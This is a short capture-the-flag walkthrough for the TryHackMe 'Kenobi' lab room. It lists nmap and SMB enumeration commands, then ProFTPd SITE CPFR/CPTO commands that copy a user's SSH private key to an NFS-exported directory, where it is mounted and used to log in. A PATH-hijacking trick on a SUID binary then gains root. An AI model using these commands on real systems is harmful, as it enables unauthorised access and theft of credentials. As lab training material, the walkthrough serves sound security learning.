# Kenobi

[link to the room](https://tryhackme.com/room/kenobi)

`export ip=10.10.48.7`



# Recon

## nmap
- `nmap -sC -sV -v -oN recon/nmap $ip`
- `nmap --script=smb-enum-shares.nse,smb-enum-users.nse -p445 -oN recon/nmap.v2 -T5 -v $ip`

- `nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount -oN recon/nmap.v3 -v $ip`
# TASK

- connect to smb: `smbclient //$ip/anonymous`

- recursively download the SMB share : `smbget -R smb://$ip/anonymous`

## Gain initial access with proFTPd

- connect to ftp : `ftp $ip`
```
site CPFR /home/kenobi/.ssh/id_rsa
site CPTO /var/tmp/id_rsa
```
- mount the /var/tmp directory to our machine:
```
mkdir /mnt/kenobiNFS
mount $ip:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS
```
- go to /var/tmp and get the private key then login to Kenobi's account:
```
cp /mnt/kenobiNFS/tmp/id_rsa .
chmod 600 id_rsa
ssh -i id_rsa kenobi@$ip
```

## PrivEsc

- find SUID executable : `find / -user root -type f -perm -u=s -exec ls -l {} \; 2> /dev/null`

- exploit relative ENV: 
```
strings /usr/bin/menu
echo /bin/bash > uname
chmod 777 uname
export PATH=.:$PATH
```